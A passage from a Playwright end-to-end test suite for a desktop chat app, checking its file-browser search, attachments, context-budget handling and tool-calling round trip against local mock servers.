    const box = page.getByRole("textbox", { name: "Search by name or path" });
    await box.fill("notes");
    await box.press("Enter");
    await page.waitForTimeout(300);
    const asked = (await page.evaluate(() => window.__FILE_CALLS__))
      .filter((call) => call.command === "brain_files_search")
      .pop();
    check(
      "filessearch: the words, scope and generation crossed to Rust",
      asked?.args?.query === "notes" && asked?.args?.scope === "/Users/marco" && typeof asked?.args?.id === "number",
      JSON.stringify(asked?.args),
    );
    const firstId = await lastId();
    await emit({
      id: firstId,
      query: "notes",
      matches: [{ name: "notes.txt", path: "/Users/marco/Documents/notes.txt", is_dir: false, kind: "text", score: 40 }],
      skipped: 0,
      limited: false,
      done: false,
    });
    await page.waitForTimeout(300);
    check(
      "filessearch: a batch renders as it arrives",
      ((await page.locator(".files-results").textContent()) ?? "").includes("notes.txt"),
    );

    // The user replaces the search; the old one's late batch must be
    // dropped by comparing the generation, not assumed impossible.
    await box.fill("other");
    await box.press("Enter");
    await page.waitForTimeout(200);
    const secondId = await lastId();
    await emit({
      id: firstId,
      query: "notes",
      matches: [{ name: "ghost.txt", path: "/stale/ghost.txt", is_dir: false, kind: "text", score: 90 }],
      skipped: 0,
      limited: false,
      done: false,
    });
    await emit({
      id: secondId,
      query: "other",
      matches: [{ name: "real.md", path: "/fresh/real.md", is_dir: false, kind: "text", score: 50 }],
      skipped: 0,
      limited: false,
      done: false,
    });
    await emit({ id: secondId, query: "other", matches: [], skipped: 12, limited: true, done: true, via_index: true });
    await page.waitForTimeout(400);
    const results = (await page.locator(".files-results").textContent()) ?? "";
    check(
      "filessearch: a late batch from a superseded search is discarded",
      !results.includes("ghost.txt") && results.includes("real.md"),
      results.slice(0, 120),
    );
    check(
      "filessearch: results reset when the search is replaced",
      !results.includes("notes.txt"),
      "the first search's rows outlived their query",
    );
    const notes = (await page.locator(".files-notes").textContent()) ?? "";
    check("filessearch: skipped is a fact on the screen", notes.includes("Skipped 12"), notes.trim());
    check("filessearch: limited is a fact on the screen", notes.includes("First 500 shown"), notes.trim());
    check(
      "filessearch: an index answer says it searched less",
      notes.includes("fast index"),
      notes.trim(),
    );

    // Moving the search to another folder clears the board: nothing on
    // screen may claim a scope it did not search. Documents lives inside
    // Home, which starts collapsed.
    await page.locator(".files-open", { hasText: "Home" }).click();
    await page.waitForTimeout(300);
    const documentsLine = page.locator(".files-line", { hasText: "Documents" }).first();
    await documentsLine.hover();
    await documentsLine.locator(".files-here").click();
    await page.waitForTimeout(300);
    check(
      "filessearch: changing scope clears the old results",
      (await page.locator(".files-results").count()) === 0,
      "the root search's rows stayed under the new scope",
    );
    check(
      "filessearch: changing scope stops the running search",
      ((await page.evaluate(() => window.__FILE_CALLS__))
        .filter((call) => call.command === "brain_files_search")
        .pop()?.args?.query ?? "none") === "",
      "no empty-query stop crossed to Rust",
    );
    const scopeLine = (await page.locator(".files-scope-line").textContent()) ?? "";
    check("filessearch: the new scope is the one named", scopeLine.includes("/Users/marco/Documents"), scopeLine.trim());

    // Leaving the tab unmounts the browser, its listener, and its search.
    // First a search is left RUNNING (the scope change above stops its own;
    // unmounting with nothing live would prove nothing), and the stops are
    // counted from that point — crediting the earlier stop to the unmount
    // would mask a missing cancel.
    await box.fill("leaf");
    await box.press("Enter");
    await page.waitForTimeout(300);
    const stopsBefore = (await page.evaluate(() => window.__FILE_CALLS__))
      .filter((call) => call.command === "brain_files_search" && call.args?.query === "").length;
    await page.getByRole("tab", { name: "Attached" }).click();
    await page.waitForTimeout(300);
    const listening = await page.evaluate(
      () => window.__FILE_LISTENERS__["brain_files_search"]?.size ?? 0,
    );
    check("filessearch: the listener is removed on unmount", listening === 0, `${listening} still subscribed`);
    const stops = (await page.evaluate(() => window.__FILE_CALLS__))
      .filter((call) => call.command === "brain_files_search" && call.args?.query === "");
    check(
      "filessearch: unmounting cancels the Rust search",
      stops.length === stopsBefore + 1,
      `${stops.length} stops after unmount, ${stopsBefore} before it — the panel left a whole-disk walk running with nobody watching`,
    );
    await browser.close();
  },

  // The same words submitted twice are two searches. A stale batch from the
  // replaced one carries the same query, so only the generation id can tell
  // it apart — this is the race the different-query test cannot see.
  async samequery() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await stubFileDoor(page, {
      roots: { roots: ["/"], home: "/Users/marco" },
      listings: {},
      search: { hits: 0, skipped: 0, limited: false, cancelled: false, via_index: false },
    });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Hello.", "line is open");
    await page.getByRole("button", { name: "Toggle the files panel" }).click();
    await page.getByRole("tab", { name: "Files" }).click();
    await page.waitForSelector(".files-search");

    const emit = (payload) => page.evaluate((p) => window.__EMIT_FILES__(p), payload);
    const lastId = async () =>
      (await page.evaluate(() => window.__FILE_CALLS__))
        .filter((call) => call.command === "brain_files_search")
        .pop()?.args?.id;
    const box = page.getByRole("textbox", { name: "Search by name or path" });

    await box.fill("notes");
    await box.press("Enter");
    await page.waitForTimeout(200);
    const firstId = await lastId();
    await box.fill("notes");
    await box.press("Enter");
    await page.waitForTimeout(200);
    const secondId = await lastId();
    check(
      "samequery: a resubmit is a new generation",
      firstId !== secondId && typeof secondId === "number",
      `first ${firstId}, second ${secondId}`,
    );

    // The first run's batch arrives late with the SAME words. Only the id
    // can refuse it.
    await emit({
      id: firstId,
      query: "notes",
      matches: [{ name: "stale.txt", path: "/old/stale.txt", is_dir: false, kind: "text", score: 90 }],
      skipped: 0,
      limited: false,
      done: false,
    });
    await emit({
      id: secondId,
      query: "notes",
      matches: [{ name: "fresh.txt", path: "/new/fresh.txt", is_dir: false, kind: "text", score: 40 }],
      skipped: 0,
      limited: false,
      done: false,
    });
    await page.waitForTimeout(400);
    const results = (await page.locator(".files-results").textContent()) ?? "";
    check(
      "samequery: the replaced run's batch is refused by id",
      !results.includes("stale.txt") && results.includes("fresh.txt"),
      results.slice(0, 120),
    );
    await browser.close();
  },

  // A link that resolves up the tree would render the same expanded row at
  // every depth, forever, because expansion is keyed by path alone. The
  // ancestor chain is what stops it.
  async filescycle() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    const loopRow = { name: "self", path: "/loop", is_dir: true, kind: "other", bytes: 0, modified_ms: null };
    await stubFileDoor(page, {
      roots: { roots: ["/"], home: "/loop" },
      listings: {
        // Expanding /loop returns /loop's own children — including the row
        // whose expansion state is the one already open above it.
        "/loop": {
          path: "/loop",
          truncated: false,
          skipped: 0,
          entries: [loopRow, { name: "real.txt", path: "/loop/real.txt", is_dir: false, kind: "text", bytes: 3, modified_ms: null }],
        },
      },
      search: { hits: 0, skipped: 0, limited: false, cancelled: false, via_index: false },
    });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Hello.", "line is open");
    await page.getByRole("button", { name: "Toggle the files panel" }).click();
    await page.getByRole("tab", { name: "Files" }).click();
    await page.waitForSelector(".files-tree");
    // Home IS /loop here: expanding it once opens the cycle, and the child
    // `self` row points straight back at it. Without the ancestor guard
    // the renderer recurses on this very expand — the page dies of stack
    // exhaustion and nothing below ever answers.
    await page.locator(".files-open", { hasText: "Home" }).click();
    const alive = await page
      .locator(".files-tree .files-name", { hasText: "real.txt" })
      .first()
      .textContent({ timeout: 5000 })
      .catch(() => null);
    check("filescycle: the tree renders inside a link loop", alive !== null, "the renderer never came back");
    // The guard's own behaviour, apart from any depth backstop: a row does
    // not stand expanded inside its own subtree. A depth cap alone would
    // render `self` expanded 24 times over and still "survive".
    const nested = await page
      .locator(".files-children .files-open[aria-expanded='true']", { hasText: "self" })
      .count();
    check(
      "filescycle: the loop row is not expanded inside its own subtree",
      nested === 0,
      `${nested} nested copies of the row rendered expanded`,
    );
    // The self row is present, shown collapsed inside its own subtree, and
    // clicking it collapses the parent rather than recursing.
    await page.locator(".files-tree .files-open", { hasText: "self" }).first().click();
    await page.waitForTimeout(300);
    await page.locator(".files-open", { hasText: "Home" }).click();
    const back = await page
      .locator(".files-tree .files-name", { hasText: "real.txt" })
      .first()
      .textContent({ timeout: 5000 })
      .catch(() => null);
    check("filescycle: the loop row toggles instead of hanging", back !== null, "the self row never came back");
    await browser.close();
  },

  // Attach from the computer: Rust reads the bytes, the page wraps them in a
  // File with the row's name, and the composer's own path does the rest.
  async filesattach() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await stubFileDoor(page, {
      roots: { roots: ["/"], home: "/Users/marco" },
      listings: {
        "/Users/marco": {
          path: "/Users/marco",
          truncated: false,
          entries: [
            { name: "Documents", path: "/Users/marco/Documents", is_dir: true, kind: "other", bytes: 0, modified_ms: null },
          ],
        },
        "/Users/marco/Documents": {
          path: "/Users/marco/Documents",
          truncated: false,
          entries: [
            { name: "notes.txt", path: "/Users/marco/Documents/notes.txt", is_dir: false, kind: "text", bytes: 15, modified_ms: null },
          ],
        },
      },
      read: [...Buffer.from("Disk notes text.")],
    });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Hello.", "line is open");
    await page.getByRole("button", { name: "Toggle the files panel" }).click();
    await page.getByRole("tab", { name: "Files" }).click();
    await page.waitForSelector(".files-tree");
    await page.locator(".files-open", { hasText: "Home" }).click();
    await page.waitForTimeout(400);
    await page.locator(".files-open", { hasText: "Documents" }).click();
    await page.waitForTimeout(400);
    await page.locator(".files-attach").first().click();
    await page.waitForTimeout(800);
    const reads = (await page.evaluate(() => window.__FILE_CALLS__)).filter(
      (call) => call.command === "brain_files_read",
    );
    check(
      "filesattach: the bytes were asked of Rust",
      reads.length === 1 && reads[0].args?.path === "/Users/marco/Documents/notes.txt",
      JSON.stringify(reads.map((call) => call.args)),
    );
    await page.getByRole("tab", { name: "Attached" }).click();
    await page.waitForTimeout(400);
    check(
      "filesattach: the row's name became an attachment",
      ((await page.locator(".panel-row .panel-name").textContent()) ?? "").includes("notes.txt"),
    );
    const attachId = await page.evaluate(() =>
      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
    );
    const attachment = JSON.parse((await stored(page, attachId)) ?? "[]")[0];
    check(
      "filesattach: extracted through the shared path",
      attachment?.name === "notes.txt" && attachment?.text === "Disk notes text.",
      JSON.stringify(attachment ?? null).slice(0, 80),
    );
    await browser.close();
  },

  // CSV: attached, and — the trap — still there after a reload, which is the
  // ATTACH_KINDS list in the store, not the upload path. Seeded once: the
  // reload this test exists to make must not wipe what the attach wrote.
  async attachcsv() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seedOnce(page, okSettings("x"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "data.csv", mimeType: "text/csv", buffer: Buffer.from("a,b\n1,2\n") },
    ]);
    await page.waitForTimeout(800);
    const meta = (await page.locator(".panel-row .panel-meta").textContent()) ?? "";
    check("attachcsv: listed with its kind", meta.includes("csv"), meta.trim());
    const attachId = await page.evaluate(() =>
      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
    );
    check("attachcsv: stored as csv", JSON.parse((await stored(page, attachId)) ?? "[]")[0]?.kind === "csv");

    // The reload: a kind the store's whitelist does not hold fails here and
    // ONLY here — the upload path above stays green while the bug is live.
    await page.reload();
    await page.waitForTimeout(1200);
    await openChat(page);
    await openSidebar(page, "data.csv");
    await page.getByRole("button", { name: "Toggle the files panel" }).click();
    await page.waitForTimeout(400);
    check(
      "attachcsv: survives a reload",
      ((await page.locator(".panel-row .panel-name").textContent()) ?? "").includes("data.csv"),
      "the store's whitelist dropped the kind",
    );
    await browser.close();
  },

  // The pre-2007 Office formats: refused with the sentence that names the
  // way out, not the generic nothing-actionable one.
  async attachlegacy() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "report.doc", mimeType: "application/msword", buffer: Buffer.from([0xd0, 0xcf, 0x11, 0xe0]) },
    ]);
    await page.waitForTimeout(600);
    const doc = (await page.locator(".attach-status").textContent()) ?? "";
    check(
      "attachlegacy: .doc names the older format and the way out",
      doc.includes("Word") && doc.includes("older format") && doc.includes(".docx"),
      doc.trim(),
    );
    check("attachlegacy: .doc does not get the generic message", !doc.includes("not a readable kind"), doc.trim());
    check("attachlegacy: .doc stored nothing", (await page.locator(".panel-row").count()) === 0);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "deck.ppt", mimeType: "application/vnd.ms-powerpoint", buffer: Buffer.from([0xd0, 0xcf, 0x11, 0xe0]) },
    ]);
    await page.waitForTimeout(600);
    const ppt = (await page.locator(".attach-status").textContent()) ?? "";
    check(
      "attachlegacy: .ppt names the older format too",
      ppt.includes("PowerPoint") && ppt.includes("older format") && ppt.includes(".pptx"),
      ppt.trim(),
    );
    await browser.close();
  },

  // JSON/log/markdown: Rust calls them readable text, so the row offers
  // Attach — and the browser's extractor must agree, or the button is a
  // promise the click breaks.
  async attachjson() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "report.json", mimeType: "application/json", buffer: Buffer.from('{"k": "v"}') },
      { name: "trace.log", mimeType: "text/plain", buffer: Buffer.from("one line") },
      { name: "readme.markdown", mimeType: "text/markdown", buffer: Buffer.from("# Title") },
    ]);
    await page.waitForTimeout(1000);
    const listed = (await page.locator(".panel-list").textContent()) ?? "";
    check(
      "attachjson: all three Rust-advertised extensions attach",
      listed.includes("report.json") && listed.includes("trace.log") && listed.includes("readme.markdown"),
      listed.slice(0, 120),
    );
    const attachId = await page.evaluate(() =>
      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
    );
    const rows = JSON.parse((await stored(page, attachId)) ?? "[]");
    check(
      "attachjson: json kept as plain text",
      rows.find((a) => a.name === "report.json")?.text === '{"k": "v"}',
    );
    await browser.close();
  },

  // The preflight: a wedged-but-reachable server is not a missing one.
  // This is the false-refusal finding, pinned by standing up a server that
  // answers slowly and asking the module the suite asks.
  async preflightslow() {
    const http = await import("node:http");
    const server = http.createServer((_req, res) => {
      setTimeout(() => {
        res.writeHead(200);
        res.end("slow but alive");
      }, 3000);
    });
    await new Promise((resolve) => server.listen(18997, "127.0.0.1", resolve));
    try {
      const { probe, reachable, complaint } = await import("./preflight.mjs");
      const slow = "http://127.0.0.1:18997";
      check(
        "preflightslow: a timeout is labelled slow, not refused",
        (await probe(slow, 500)) === "slow",
      );
      const verdict = await reachable(slow);
      check(
        "preflightslow: the patient budget reaches a slow server",
        verdict.ok === true,
        JSON.stringify(verdict),
      );
      const dead = await reachable("http://127.0.0.1:18998");
      check(
        "preflightslow: a refused port is still refused",
        dead.ok === false && dead.how === "refused",
        JSON.stringify(dead),
      );
      check(
        "preflightslow: the complaint names the way to start it",
        (complaint("http://x", "start it this way", { ok: false, how: "refused" }) ?? "").includes("start it this way"),
      );
    } finally {
      await new Promise((resolve) => server.close(resolve));
    }
  },

  // Small context: the oversized file is refused WITH its numbers.
  async refusefit() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: { endpoint: "http://127.0.0.1:18081/small", token: "t", model: "x" } });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "big.txt", mimeType: "text/plain", buffer: Buffer.from(`B testo. ${"y".repeat(1185)}`) },
    ]);
    await page.waitForTimeout(1500);
    const banner = page.locator(".refusal-banner");
    check("refusefit: refusal shown", (await banner.count()) === 1);
    const text = ((await banner.count()) === 1 ? await banner.textContent() : null) ?? "";
    // 1194 chars -> 299 tokens; 299 + 0 + 512 reserve = 811 > 256.
    check("refusefit: real numbers", text.includes("256") && text.includes("811"), text.slice(0, 120));
    check("refusefit: never attached", (await page.locator(".panel-row").count()) === 0);
    await shot(page, "shots/62-refusal.png");
    await browser.close();
  },

  // Unknown context: attached, but the panel says the size is unchecked.
  async unknownctx() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: { endpoint: "http://127.0.0.1:18081/denied", token: "t", model: "x" } });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "note.txt", mimeType: "text/plain", buffer: Buffer.from("Small note.") },
    ]);
    await page.waitForTimeout(1500);
    check("unknownctx: attached anyway", ((await page.locator(".panel-list").textContent()) ?? "").includes("note.txt"));
    const unknownCount = await page.locator(".budget-unknown").count();
    check(
      "unknownctx: unknown said aloud",
      unknownCount === 1 &&
        ((await page.locator(".budget-unknown").textContent()) ?? "").includes("unknown"),
    );
    check("unknownctx: no scale", (await page.locator(".budget-bar").count()) === 0);
    check("unknownctx: no refusal", (await page.locator(".refusal-banner").count()) === 0);
    await browser.close();
  },

  // Tight context: old turns drop from the wire, the document stays.
  // Exact arithmetic (estTokens = ceil(chars/4)):
  // attach: doc 100 + hist 377 + 512 reserve = 989 <= 1024.
  // send:   doc 100 + hist 477 + 512 reserve = 1089 > 1024 -> prune 3.
  async prunekeep() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    const messages = [];
    for (let i = 0; i < 13; i++) {
      const tag = `Q${String(i).padStart(2, "0")}`;
      messages.push({ id: `u${i}`, role: "user", content: `${tag} ${"q".repeat(112)}`, createdAt: i });
    }
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18081/tight", token: "t", model: "x" },
      convos: [{ id: "t1", title: "Tight", createdAt: 1, updatedAt: 1, messages }],
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await openSidebar(page, "Tight");
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "keep.txt", mimeType: "text/plain", buffer: Buffer.from(`KEEPME ${"k".repeat(393)}`) },
    ]);
    await page.waitForTimeout(1500);
    check("prunekeep: attached", ((await page.locator(".panel-list").textContent()) ?? "").includes("keep.txt"));
    const newMsg = `Summarize it all now, every early part included, please do not skip anything at all, full detail now. ${"z".repeat(292)}`;
    await page.getByRole("textbox", { name: "Message" }).fill(newMsg);
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("line is open"),
      null,
      { timeout: 20000 },
    );
    const body = await lastBody(page);
    const wire = JSON.stringify(body?.messages ?? []);
    check("prunekeep: document still pinned", wire.includes("KEEPME"));
    check("prunekeep: oldest turns dropped", !wire.includes("Q00") && !wire.includes("Q02"));
    check("prunekeep: newest kept", wire.includes("Q12") && wire.includes("zzzzzzzzzz"));
    // Pruning is wire-only: the visible thread keeps everything.
    const threadText = (await page.locator(".thread").textContent()) ?? "";
    check("prunekeep: storage intact", threadText.includes("Q00"));
    await browser.close();
  },

  // Detached to history and back, text intact.
  async historyreattach() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "cycle.txt", mimeType: "text/plain", buffer: Buffer.from("Round-trip text.") },
    ]);
    await page.waitForTimeout(800);
    await page.locator(".sidebar-row").first().hover();
    await page.getByRole("button", { name: "Remove" }).click();
    await page.waitForTimeout(400);
    check("historyreattach: in history", ((await page.locator(".panel-list").textContent()) ?? "").includes("Reattach"));
    await page.getByRole("button", { name: "Reattach" }).click();
    await page.waitForTimeout(400);
    const id = await page.evaluate(() =>
      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
    );
    const atts = JSON.parse((await stored(page, id)) ?? "[]");
    const back = atts.find((a) => a.name === "cycle.txt");
    check("historyreattach: active again with text", back?.active === true && back?.text === "Round-trip text.");
    await browser.close();
  },

  // Growth after attaching can still overflow: the send is refused aloud.
  // Exact arithmetic: doc 500 + newest 25 + 512 reserve = 1037 > 1024,
  // while attach time (500 + 0 + 512 = 1012) fit.
  async oversizesend() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18081/tight", token: "t", model: "x" },
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "anchor.txt", mimeType: "text/plain", buffer: Buffer.from(`ANCHOR ${"n".repeat(1993)}`) },
    ]);
    await page.waitForTimeout(1500);
    check("oversizesend: attached first", ((await page.locator(".panel-list").textContent()) ?? "").includes("anchor.txt"));
    await page.getByRole("textbox", { name: "Message" }).fill(`Tip it over the edge now, please, and do not hold anything back at all. ${"m".repeat(28)}`);
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    try {
      await page.waitForFunction(
        () => document.querySelector(".thread")?.textContent?.includes("exceeds the context"),
        null,
        { timeout: 20000 },
      );
    } catch {
      check("oversizesend: refused aloud", false, "wait timed out");
    }
    const detailCount = await page.locator(".error-detail").count();
    const detail = detailCount === 1 ? (await page.locator(".error-detail").textContent()) ?? "" : "";
    check("oversizesend: numbers shown", detail.includes("1,024"), detail.slice(0, 100));
    await browser.close();
  },

  // The meter's terms sum to its total — the assert that would have
  // caught the missing reserve in the refusal text.
  async metersum() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    const messages = [];
    for (let i = 0; i < 5; i++) {
      messages.push({ id: `u${i}`, role: "user", content: `Meter Q${i} ${"m".repeat(96)}`, createdAt: i });
    }
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18081/tight", token: "t", model: "x" },
      convos: [{ id: "m1", title: "Metered", createdAt: 1, updatedAt: 1, messages }],
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await openSidebar(page, "Metered");
    await page.locator('.composer input[type="file"]').setInputFiles([
      { name: "m.txt", mimeType: "text/plain", buffer: Buffer.from(`METER ${"w".repeat(193)}`) },
    ]);
    await page.waitForTimeout(1500);
    const n = async (term) => {
      // Absence-tolerant: a dropped term must FAIL the sum check below,
      // not explode here as a raw TimeoutError (round-24 rule).
      try {
        return parseInt(
          (await page.locator(`[data-term="${term}"]`).getAttribute("data-n", { timeout: 5000 })) ?? "NaN",
          10,
        );
      } catch {
        return NaN;
      }
    };
    const [docs, hist, reserve, left, total] = await Promise.all([
      n("docs"),
      n("history"),
      n("reserve"),
      n("left"),
      n("total"),
    ]);
    check("metersum: terms sum to total", docs + hist + reserve + left === total, `${docs}+${hist}+${reserve}+${left}=${total}`);
    check("metersum: reserve named", reserve === 512);
    check("metersum: total is the server size", total === 1024);
    const widths = await page.locator(".budget-bar span").evaluateAll((els) =>
      els.map((el) => parseFloat(el.style.width)),
    );
    const widthSum = widths.reduce((a, b) => a + b, 0);
    // The bar covers the used share; the rest is empty track by design.
    const usedShare = ((total - left) / total) * 100;
    check("metersum: bar matches used share", Math.abs(widthSum - usedShare) < 0.6, `${widthSum.toFixed(1)}% vs ${usedShare.toFixed(1)}%`);
    await browser.close();
  },
  // At rest, nothing moves document-wide (sidebar included): zero running
  // animations anywhere once every stream settled. getAnimations() cannot
  // see setInterval/rAF — the app holds no rAF loops, and live timers are
  // counted separately below; both limits are stated, not implied.
  async stillness() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await page.addInitScript(() => {
      window.__liveTimers = new Set();
      const origSet = window.setTimeout.bind(window);
      const origClear = window.clearTimeout.bind(window);
      window.setTimeout = ((fn, ms, ...rest) => {
        const id = origSet((...args) => {
          window.__liveTimers.delete(id);
          fn(...args);
        }, ms, ...rest);
        window.__liveTimers.add(id);
        return id;
      });
      window.clearTimeout = ((id) => {
        window.__liveTimers.delete(id);
        origClear(id);
      });
    });
    await seed(page, { settings: okSettings("think-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Count the sheep.", "8 sheep left");
    await page.waitForTimeout(4000);
    const running = await page.evaluate(() =>
      document.getAnimations().filter((a) => a.playState === "running").length,
    );
    check("stillness: zero running animations document-wide", running === 0, `${running} running`);
    const timers = await page.evaluate(() => window.__liveTimers.size);
    check("stillness: zero live timers at rest", timers === 0, `${timers} pending`);
    await browser.close();
  },
  async silent() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, { settings: okSettings("silent-demo") });
    await openChat(page);
    await page.waitForTimeout(1200);
    await sendAndWait(page, "Are you there?", "took too long", 80000);
    check("silent: idle timeout fires", true);
    await browser.close();
  },
  // Tool calling, end to end: the model asks for a search, the tool runs
  // through the desktop door (stubbed here — offered tools exist only where a
  // command can run them), the result goes back on the wire, and the answer
  // arrives. Then the same page is reloaded: the tool activity is part of the
  // transcript, not of the live stream.
  // Tool calling, end to end: the model asks for a search, the tool runs
  // through the desktop door (stubbed here — offered tools exist only where a
  // command can run them), the result goes back on the wire, and the answer
  // arrives. Then a reload, a switch that is off, and a page with no door.
  async tools() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON, fetch: "The page text." });
    await seedOnce(page, toolSettings("tools-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "What is the weather in Lisbon this weekend?", "mild");

    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) =>
      String(c.command).startsWith("brain_web_"),
    );
    check("tools: the search ran through the desktop door", calls.length === 1 && calls[0].command === "brain_web_search", JSON.stringify(calls));
    check("tools: the call carried an id Stop could name", typeof calls[0]?.args?.id === "number", JSON.stringify(calls[0]?.args));
    check("tools: the query was reassembled from split chunks", calls[0]?.args?.query === "weather in Lisbon", JSON.stringify(calls[0]?.args));

    // The mock refuses a malformed round trip with a 400, so an answer here
    // means the whole sequence was right: one assistant call, one result,
    // matched by id, with words in it.
    const bodies = await allBodies(page);
    const first = bodies[0];
    const wired = bodies[bodies.length - 1]?.messages ?? [];
    const asked = wired.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).pop();
    const results = wired.filter((m) => m.role === "tool");
    check("tools: the loop asked again exactly once", bodies.length === 2, String(bodies.length));
    check("tools: one call and one result came back", asked?.tool_calls?.length === 1 && results.length === 1, `${asked?.tool_calls?.length} / ${results.length}`);
    check("tools: tool_choice starts at auto", first?.tool_choice === "auto", String(first?.tool_choice));
    check("tools: the argument JSON survived the wire", asked?.tool_calls?.[0]?.function?.arguments === '{"query":"weather in Lisbon"}', asked?.tool_calls?.[0]?.function?.arguments);
    check("tools: the result answers the same call id", results[0]?.tool_call_id === asked?.tool_calls?.[0]?.id, `${results[0]?.tool_call_id} vs ${asked?.tool_calls?.[0]?.id}`);
    check("tools: the result carried the tool's words", (results[0]?.content ?? "").includes("Lisbon weekend forecast"));

    const thread = (await page.locator(".thread").textContent()) ?? "";
    check("tools: the thread says what was searched", thread.includes("Searched for"), thread.slice(0, 200));
    check("tools: the thread shows the query", thread.includes("weather in Lisbon"));

    // The trap the recon report named, and the check that makes it bite: the
    // transcript must hold the run itself, with no `tool` role anywhere.
    await page
      .waitForFunction(
        () =>
          Object.keys(localStorage).some(
            (k) => k.startsWith("crescent-chat.msgs.") && (JSON.parse(localStorage.getItem(k) ?? "[]") ?? []).some((m) => (m.toolRuns ?? []).length > 0),
          ),
        null,
        { timeout: 10000 },
      )
      .catch(() => check("tools: the run reached the disk", false, "never written"));
    const stored = await page.evaluate(() => ({ ...localStorage }));
    const key = Object.keys(stored).find((k) => k.startsWith("crescent-chat.msgs."));
    const messages = JSON.parse(stored[key] ?? "[]");
    const assistant = messages.find((m) => m.role === "assistant");
    check(
      "tools: the transcript keeps the run and no tool role",
      messages.length === 2 &&
        messages.every((m) => m.role === "user" || m.role === "assistant") &&
        assistant?.toolRuns?.length === 1 &&
        assistant.toolRuns[0].state === "ok",
      JSON.stringify(messages.map((m) => ({ role: m.role, runs: (m.toolRuns ?? []).length }))),
    );

    // The switch, the door, and nothing else may decide. One assertion for all
    // three directions, so dropping tools anywhere — or offering them where
    // nothing can run them — is red.
    const off = await browser.newPage();
    await stubDoor(off, { search: LISBON });
    await seedOnce(off, toolSettings("toolsloop-demo", false));
    await openChat(off);
    await off.waitForTimeout(1200);
    await resetMock(off);
    await off.getByRole("textbox", { name: "Message" }).fill("Just answer.");
    await off.getByRole("textbox", { name: "Message" }).press("Enter");
    await off.waitForTimeout(3000);
    // Read this page's bodies before the next page resets the mock: the
    // counter is the mock's, not the tab's.
    const offBodies = await allBodies(off);

    const plain = await browser.newPage();
    // No desktop, no server: without this window's own Tauri there is no
    // endpoint anymore (the removed setting was the only other road), so
    // this page has nothing it could send — the third half of the claim.
    await seedOnce(plain, { model: "toolsloop-demo" });
    await openChat(plain);
    await plain.waitForTimeout(800);
    await resetMock(plain);

    const offered = (body) => (body?.tools ?? []).length;
    const plainBodies = await allBodies(plain);
    const withDoor = offered(first);
